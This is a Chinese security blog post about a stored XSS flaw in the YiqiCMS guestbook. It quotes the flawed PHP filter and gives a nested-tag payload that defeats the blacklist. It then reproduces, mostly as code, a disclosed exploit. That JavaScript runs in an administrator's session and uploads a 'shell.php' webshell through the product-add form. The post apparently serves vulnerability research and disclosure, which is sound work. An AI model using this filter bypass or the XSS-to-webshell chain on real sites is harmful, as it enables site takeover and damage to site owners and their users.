<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> yiqicms xss · xd_xd's blog</title><meta name="description" content="yiqicms xss - xd_xd"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://xdxd.love/atom.xml" title="xd_xd's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/u/5256150165?is_all=1" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/stayliv3" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">yiqicms xss</h1><div class="post-info">Apr 2, 2015</div><div class="post-content"><p>易企CMS这个留言存在的XSS在乌云已经报过了。没有彻底修复。通过XSS获取shell还是比较有利用价值的。这个攻防的点有两种比较传统的防御方案，算是比较典型的场景。都有对应的绕过方式。比较经典。</p>
<p>限制条件有两个：</p>
<p>一个是字符数限制，另一个是简单的黑名单过滤。</p>
<pre><code><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">"save"</span>)
{
    <span class="variable">$msgtitle</span> = $_POST[<span class="string">"msgtitle"</span>];
    <span class="variable">$msgname</span> = $_POST[<span class="string">"msgname"</span>];
    <span class="variable">$msgcontact</span> = $_POST[<span class="string">"msgcontact"</span>];
    <span class="variable">$msgcontent</span> = htmlspecialchars($_POST[<span class="string">"msgcontent"</span>]);

    // if (empty($_SESSION[<span class="string">'captcha'</span>]) || trim(strtolower($_POST[<span class="string">'capcode'</span>])) != $_SESSION[<span class="string">'captcha'</span>]) 
    // {
    //     ShowMsg(<span class="string">"验证码错误,请重新输入"</span>);
    //     exit();
    // }

    if(!preg_match(<span class="string">"/^.{1,30}$/"</span>,<span class="variable">$msgtitle</span>))
    {
        ShowMsg(<span class="string">"请输入正确的标题"</span>);
        exit();
    }
    if(!preg_match(<span class="string">"/^.{1,10}$/"</span>,<span class="variable">$msgname</span>))
    {
        ShowMsg(<span class="string">"请输入您的姓名"</span>);
        exit();
    }
    if(!preg_match(<span class="string">"/^.{1,20}$/"</span>,<span class="variable">$msgcontact</span>))
    {
        ShowMsg(<span class="string">"请输入正确的联系方式"</span>);
        exit();
    }
    if(!preg_match(<span class="string">"/^.{1,200}$/"</span>,<span class="variable">$msgcontent</span>))
    {
        ShowMsg(<span class="string">"请输入正确的留言内容"</span>);
        exit();
    }

    <span class="variable">$msgcontent</span> = safeCheck(<span class="variable">$msgcontent</span>);
</code></pre><p>name title等字段限制了字符数。content修复使用了htmlspecialcahrs，这样修复是没问题的。之前使用了safeCheck检查。看一下safecheck：</p>
<pre><code><span class="keyword">function</span> safeCheck(<span class="variable">$str</span>) 
{ 
    <span class="variable">$farr</span> = array(
        <span class="string">"/&lt;(\/?)(script|i?frame|style|html|body|title|link|object|meta|\?|\%)([^&gt;]*?)&gt;/isU"</span>,  //过滤 &lt;script 等可能引入恶意内容或恶意改变显示布局的代码,如果不需要插入flash等,还可以加入&lt;object的过滤 
        <span class="string">"/(&lt;[^&gt;]*)on[a-zA-Z]+\s*=([^&gt;]*&gt;)/isU"</span>,                                      //过滤javascript的on事件 

   ); 
   <span class="variable">$tarr</span> = array(
        <span class="string">""</span>, 
        <span class="string">""</span>, 
   ); 

  <span class="variable">$str</span> = preg_replace(<span class="variable">$farr</span>,<span class="variable">$tarr</span>,<span class="variable">$str</span>); 
   return <span class="variable">$str</span>; 
</code></pre><p>safecheck这里有两个主要的问题。一个是黑名单，xss领域的黑名单几乎是一定可以绕过的。第二个是恶意内容替换为空，替换为空可以使用重复的方式绕过，导致黑名单完全失效。</p>
<p>测试poc： </p>
<pre><code>&lt;scri&lt;script&gt;pt&gt;<span class="function"><span class="title">alert</span><span class="params">(<span class="number">2222</span>)</span></span>&lt;/scr&lt;/script&gt;ipt&gt;
</code></pre><p>替换为空之后就变成了</p>
<pre><code><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">alert(2222)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</code></pre><p>绕过黑名单过滤。</p>
<p>限制字符数的方式可以通过多条评论加注释绕过。这个手法也比较经典了。</p>
<p>乌云上给出了一个xhr同域下上传文件的exp，值得参考：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-077599" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-077599</a></p>
<pre><code>&lt;script&gt;

            function ajax()<span class="special">{</span>

                var request = false;

                if(window.XMLHttpRequest) <span class="special">{</span>

                    request = new XMLHttpRequest();

                <span class="special">}</span> else if(window.ActiveXObject) <span class="special">{</span>

                    var versions = <span class="special">[</span>'Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'<span class="special">]</span>;

                    for(var i=0; i&lt;versions.length; i++) <span class="special">{</span>

                        try <span class="special">{</span>

                            request = new ActiveXObject(versions<span class="special">[</span>i<span class="special">]</span>);             

                        <span class="special">}</span> catch(e) <span class="special">{</span><span class="special">}</span>              

                    <span class="special">}</span>              

                <span class="special">}</span>              

                return request;              

            <span class="special">}</span>

            var _x = ajax();              

            postgo();

            function postgo() <span class="special">{</span>              

                src="http://192.168.10.70/yiqicms/admin/product-add.php";

                data="------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productname"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\nxxxxxx</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productcategory"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>3<span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productseotitle"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\nxxxxxx</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productkeywords"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productdescription"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productthumb"; filename="shell.php"<span class="command">\r</span><span class="command">\nContent</span>-Type: application/php<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productadddate"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>2014-09-28 09:13:04<span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productfilename"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="producttemplets"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span><span class="special">{</span>style<span class="special">}</span>/product.tpl<span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="productcontent"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>&lt;p&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;<span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="chk<span class="special">[</span><span class="special">]</span>"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>1<span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="extname<span class="special">[</span>1<span class="special">]</span>"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="extvalue<span class="special">[</span>1<span class="special">]</span>"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB<span class="command">\r</span><span class="command">\nContent</span>-Disposition: form-data; name="action"<span class="command">\r</span><span class="command">\n</span><span class="command">\r</span><span class="command">\nsave</span><span class="command">\r</span><span class="command">\n</span>------WebKitFormBoundaryB6QWa9tMYBn1hUTB--";

                xhr_act("POST",src,data);              

            <span class="special">}</span>              

            function xhr_act(_m,_s,_a)<span class="special">{</span>

                _x.open(_m,_s,false);                

                cookie = document.cookie;

                if(_m=="POST")<span class="special">{</span>

                    _x.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");

                    _x.setRequestHeader("Cookie",cookie);

                <span class="special">}</span>              

                _x.send(_a);              

                return _x.responseText;             

            <span class="special">}</span>
</code></pre></div></article></div></section><footer><div class="paginator"><a href="/2015/04/03/refer-xss/" class="prev">上一篇</a><a href="/2015/04/01/ali-ctf-xss/" class="next">下一篇</a></div><div class="copyright"><p>© 2015 - 2016 <a href="http://xdxd.love">xd_xd</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>